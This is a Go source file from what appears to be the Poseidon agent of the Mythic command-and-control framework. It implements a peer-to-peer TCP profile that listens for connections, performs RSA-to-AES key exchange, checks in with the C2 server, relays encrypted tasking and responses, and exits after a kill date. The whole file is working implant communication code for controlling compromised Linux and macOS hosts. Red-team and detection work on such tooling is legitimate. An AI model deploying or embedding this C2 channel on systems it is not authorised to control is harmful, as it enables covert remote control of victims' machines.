//go:build (linux || darwin) && poseidon_tcp

package profiles

import (
	"crypto/rsa"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"io"
	"net"
	"os"
	"sync"
	"time"

	"github.com/google/uuid"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// All variables must be a string so they can be set with ldflags
var poseidon_tcp_initial_config string

type TCPInitialConfig struct {
	Port                   uint   `json:"port"`
	Killdate               string `json:"killdate"`
	EncryptedExchangeCheck bool   `json:"encrypted_exchange_check"`
	AESPSK                 string `json:"AESPSK"`
}

type C2PoseidonTCP struct {
	ExchangingKeys       bool                `json:"ExchangingKeys"`
	Key                  string              `json:"Key"`
	RsaPrivateKey        *rsa.PrivateKey     `json:"RsaPrivateKey"`
	Port                 string              `json:"Port"`
	EgressTCPConnections map[string]net.Conn `json:"-"`
	FinishedStaging      bool                `json:"FinishedStaging"`
	Killdate             time.Time           `json:"Killdate"`
	egressLock           sync.RWMutex
	ShouldStop           bool `json:"ShouldStop"`
	stoppedChannel       chan bool
	PushChannel          chan structs.MythicMessage `json:"-"`
	stopListeningChannel chan bool
}

func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(poseidon_tcp_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial poseidon tcp config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := TCPInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial poseidon tcp config, exiting: %v\n", err))
		os.Exit(1)
	}
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := C2PoseidonTCP{
		Key:                  initialConfig.AESPSK,
		Port:                 fmt.Sprintf("%d", initialConfig.Port),
		ExchangingKeys:       initialConfig.EncryptedExchangeCheck,
		EgressTCPConnections: make(map[string]net.Conn),
		FinishedStaging:      false,
		Killdate:             killDateTime,
		ShouldStop:           false,
		stoppedChannel:       make(chan bool, 1),
		PushChannel:          make(chan structs.MythicMessage, 100),
		stopListeningChannel: make(chan bool, 1),
	}
	// these two functions only need to happen once, not each time the profile is started
	go profile.CreateMessagesForEgressConnections()
	go profile.CheckForKillDate()
	RegisterAvailableC2Profile(&profile)
}
func (c *C2PoseidonTCP) CheckForKillDate() {
	for true {
		time.Sleep(time.Duration(10) * time.Second)
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
	}
}
func (c *C2PoseidonTCP) Start() {
	// start listening
	var listen net.Listener
	var err error
	c.ShouldStop = false
	go func() {
		<-c.stopListeningChannel
		listen.Close()
		c.stoppedChannel <- true
	}()
	for {
		listen, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", c.Port))

		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to bind: %v\n", err))
			time.Sleep(1 * time.Second)
		}
		utils.PrintDebug(fmt.Sprintf("Listening on %s\n", c.Port))
		if c.ShouldStop {
			return
		}
		break
	}

	//fmt.Printf("Started listening...\n")
	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("Failed to accept connection")
			return
		}
		go c.handleClientConnection(conn)
	}
}
func (c *C2PoseidonTCP) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	c.stopListeningChannel <- true
	utils.PrintDebug("issued stop to poseidon_tcp\n")
	<-c.stoppedChannel
	utils.PrintDebug("poseidon_tcp fully stopped\n")
}
func (c *C2PoseidonTCP) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2PoseidonTCP) IsRunning() bool {
	return !c.ShouldStop
}
func (c *C2PoseidonTCP) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.FinishedStaging = true
	c.ExchangingKeys = false
}
func (c *C2PoseidonTCP) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "Port":
		c.Port = value
		c.Stop()
		go c.Start()
	default:

	}
}
func (c *C2PoseidonTCP) GetPushChannel() chan structs.MythicMessage {
	if !c.ShouldStop {
		return c.PushChannel
	}
	return nil
}
func (c *C2PoseidonTCP) handleClientConnection(conn net.Conn) {
	// this is a new client connection to this listening server
	// first thing we want to do is save it off
	connectionUUID := uuid.New().String()
	c.EgressTCPConnections[connectionUUID] = conn
	go c.handleEgressConnectionIncomingMessage(conn)
	if c.FinishedStaging {
		utils.PrintDebug(fmt.Sprintf("FinishedStaging, Got a new connection, sending checkin\n"))
		go c.CheckIn()
	} else if c.ExchangingKeys {
		//fmt.Printf("ExchangingKeys, starting EKE\n")
		go c.NegotiateKey()
	} else {
		//fmt.Printf("Not finished staging, not exchanging keys, sending checkin\n")
		go c.CheckIn()
	}
}
func (c *C2PoseidonTCP) handleEgressConnectionIncomingMessage(conn net.Conn) {
	// These are normally formatted messages for our agent
	// in normal base64 format with our uuid, parse them as such
	var sizeBuffer uint32
	var enc_raw []byte
	//fmt.Printf("handleEgressConnectionIncomingMessage started\n")
	for {
		err := binary.Read(conn, binary.BigEndian, &sizeBuffer)
		if err != nil {
			//fmt.Println("Failed to read size from tcp connection:", err)
			if err == io.EOF {
				// the connection is broken, we should remove this entry from our egress map
				c.RemoveEgressTCPConnectionByConnection(conn)
			}
			return
		}
		if sizeBuffer > 0 {
			readBuffer := make([]byte, sizeBuffer)

			readSoFar, err := conn.Read(readBuffer)
			if err != nil {
				//fmt.Println("Failed to read bytes from tcp connection:", err)
				if err == io.EOF {
					// the connection is broken, we should remove this entry from our egress map
					c.RemoveEgressTCPConnectionByConnection(conn)
				}
				return
			}
			totalRead := uint32(readSoFar)
			for totalRead < sizeBuffer {
				// we didn't read the full size of the message yet, read more
				nextBuffer := make([]byte, sizeBuffer-totalRead)
				readSoFar, err = conn.Read(nextBuffer)
				if err != nil {
					//fmt.Println("Failed to read bytes from tcp connection:", err)
					if err == io.EOF {
						// the connection is broken, we should remove this entry from our egress map
						c.RemoveEgressTCPConnectionByConnection(conn)
					}
					return
				}
				copy(readBuffer[totalRead:], nextBuffer)
				totalRead = totalRead + uint32(readSoFar)
			}
			utils.PrintDebug(fmt.Sprintf("Read %d bytes from p2p connection\n", totalRead))
			if raw, err := base64.StdEncoding.DecodeString(string(readBuffer)); err != nil {
				//log.Println("Error decoding base64 data: ", err.Error())
				continue
			} else if len(raw) < 36 {
				continue
			} else if len(c.Key) != 0 {
				//log.Println("just did a post, and decrypting the message back")
				enc_raw = c.decryptMessage(raw[36:])
				//log.Println(enc_raw)
				if len(enc_raw) == 0 {
					// failed somehow in decryption
					continue
				}
			} else {
				enc_raw = raw[36:]
			}
			// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
			if c.FinishedStaging {
				taskResp := structs.MythicMessageResponse{}
				err = json.Unmarshal(enc_raw, &taskResp)
				if err != nil {
					fmt.Printf("Failed to unmarshal message into MythicResponse: %v\n", err)
				}
				utils.PrintDebug(fmt.Sprintf("Raw message from mythic: %s\n", string(enc_raw)))
				responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
			} else {
				if c.ExchangingKeys {
					// this will be our response to the initial staging message
					if c.FinishNegotiateKey(enc_raw) {
						c.CheckIn()
					} else {
						// we ran into some sort of issue during the staging process, so start it again
						c.NegotiateKey()
					}
				} else {
					// should be the result of c.Checkin()
					checkinResp := structs.CheckInMessageResponse{}
					err = json.Unmarshal(enc_raw, &checkinResp)
					if checkinResp.Status == "success" {
						SetMythicID(checkinResp.ID)
						c.FinishedStaging = true
					} else {
						//fmt.Printf("Failed to checkin, got a weird message: %s\n", string(enc_raw))
					}
				}
			}
		}
	}
}

func (c *C2PoseidonTCP) ProfileName() string {
	return "poseidon_tcp"
}
func (c *C2PoseidonTCP) IsP2P() bool {
	return true
}

// CheckIn - either a new agent or a new client connection, do the same for both
func (c *C2PoseidonTCP) CheckIn() structs.CheckInMessageResponse {
	checkin := CreateCheckinMessage()
	response := structs.CheckInMessageResponse{}
	raw, err := json.Marshal(checkin)
	if err != nil {
		fmt.Printf("Failed to marshal checkin message\n")
		response.Status = "error"
		return response
	}
	c.SendMessage(raw)
	response.Status = "success"
	return response
}

func (c *C2PoseidonTCP) FinishNegotiateKey(resp []byte) bool {
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err := json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
		return false
	}
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}
	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false
	return true
}

// NegotiateKey - EKE key negotiation
func (c *C2PoseidonTCP) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	c.SendMessage(raw)
	return true
}

// htmlPostData HTTP POST function
func (c *C2PoseidonTCP) SendMessage(sendData []byte) []byte {
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data")
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() == "" {
		//fmt.Printf("prepending payload uuid\n")
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	} else {
		//fmt.Printf("prepending %s\n", GetMythicID())
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	}
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	// Write the bytes out to the TCP connection, bytes.NewBuffer(sendData)
	// This needs to go out one of the EgressConnections, doesn't matter which
	for {
		// make a copy of the keys for the c.EgressTCPConnections to loop over
		// that way we can safely remove bad entries of the actual c.EgressTCPConnections in our loop without issue
		keys := make([]string, len(c.EgressTCPConnections))
		i := 0
		for k := range c.EgressTCPConnections {
			keys[i] = k
			i++
		}
		for _, connectionUUID := range keys {
			err := binary.Write(c.EgressTCPConnections[connectionUUID], binary.BigEndian, uint32(len(sendData)))
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to send down pipe with error: %v\n", err))
				// need to make sure we track that this egress connection is dead and should be removed
				c.RemoveEgressTCPConnection(connectionUUID)
				time.Sleep(200 * time.Millisecond)
				continue
			}
			_, err = c.EgressTCPConnections[connectionUUID].Write(sendData)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to send with error: %v\n", err))
				// need to make sure we track that this egress connection is dead and should be removed
				c.RemoveEgressTCPConnection(connectionUUID)
				time.Sleep(200 * time.Millisecond)
				continue
			}
			//PrintDebug(fmt.Sprintf("Sent %d bytes to connection\n", totalWritten))
			return nil
		}
		// if we get here it means we have no more active egress connections, so we can't send it anywhere useful
		time.Sleep(200 * time.Millisecond)
	}
}

func (c *C2PoseidonTCP) CreateMessagesForEgressConnections() {
	// got a message that needs to go to one of the c.ExternalConnection
	for {
		msg := <-c.PushChannel
		raw, err := json.Marshal(msg)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
			continue
		}
		//fmt.Printf("Sending message outbound to websocket: %v\n", msg)
		c.SendMessage(raw)
	}
}

func (c *C2PoseidonTCP) RemoveEgressTCPConnection(connectionUUID string) bool {
	c.egressLock.Lock()
	defer c.egressLock.Unlock()
	utils.PrintDebug(fmt.Sprintf("removing egress connection: %s\n", connectionUUID))
	if conn, ok := c.EgressTCPConnections[connectionUUID]; ok {
		conn.Close()
		delete(c.EgressTCPConnections, connectionUUID)
		return true
	}
	return false
}

func (c *C2PoseidonTCP) RemoveEgressTCPConnectionByConnection(connection net.Conn) bool {
	c.egressLock.Lock()
	defer c.egressLock.Unlock()
	utils.PrintDebug(fmt.Sprintf("removing egress connection\n"))
	for connectionUUID, conn := range c.EgressTCPConnections {
		if connection.RemoteAddr().String() == conn.RemoteAddr().String() {
			// found the match, remove it and break
			conn.Close()
			delete(c.EgressTCPConnections, connectionUUID)
			//c.RemoveEgressTCPConnection(connectionUUID)
			return true
		}
	}
	return false
}

func (c *C2PoseidonTCP) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2PoseidonTCP) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	//fmt.Printf("Decrypting with key: %s\n", hex.EncodeToString(key))
	//fmt.Printf("Decrypting message: %s\n", hex.EncodeToString(msg))
	return crypto.AesDecrypt(key, msg)
}

func (c *C2PoseidonTCP) SetSleepInterval(interval int) string {
	return fmt.Sprintf("Sleep interval not used for poseidon_tcp P2P Profile\n")
}

func (c *C2PoseidonTCP) SetSleepJitter(jitter int) string {
	return fmt.Sprintf("Sleep Jitter not used for poseidon_tcp P2P Profile\n")
}

func (c *C2PoseidonTCP) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	return 0
}
